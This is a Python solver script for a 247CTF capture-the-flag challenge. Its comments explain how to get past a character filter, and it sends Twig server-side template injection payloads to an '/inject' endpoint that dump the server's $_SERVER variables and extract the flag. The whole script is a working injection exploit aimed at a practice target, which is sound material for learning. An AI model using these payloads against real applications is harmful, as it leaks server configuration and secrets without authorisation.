import requests

# NOTE: The regex '/[^{\.}a-z\|\_]/' prevents us from writing
#       '$', uppercase letters, numbers, parenthesis, etc, which
#        prevents us from calling functions, accessing the `$_SERVER`
#        variable directly, etc.
#        Luckily, we can still type lowercase letters, the pipe operator,
#        and dots. This allows us to access the `app.request.server` variable,
#        which is equivalent to the standard `$_SERVER`.
#        We can't access its fields though, because the characters `[, ", ", ]` 
#        are all blocked by the regex. What we can do though, is turn the
#        variable into a string and display it. This can be achieved through
#        the `join` filter, which will display a messy output but will show the flag.

ctf_url = "https://03a34e9cc152013a.247ctf.com"

print("[*] Dumping $_SERVER keys...")
resp = requests.get(f"{ctf_url}/inject", [("inject", "{{app.request.server|keys|json_encode|raw}}")])
print(f"[*] $_SERVER key dump: {resp.text}")

print("[*] Getting flag from stringified 'app.request.server'...")
resp = requests.get(f"{ctf_url}/inject", [("inject", "{{app.request.server|join}}")])

flag_start = resp.text.find("247CTF{")
flag_end = resp.text.find("}", flag_start)
flag = resp.text[flag_start:flag_end + 1]
print(f"[*] Flag: {flag}")
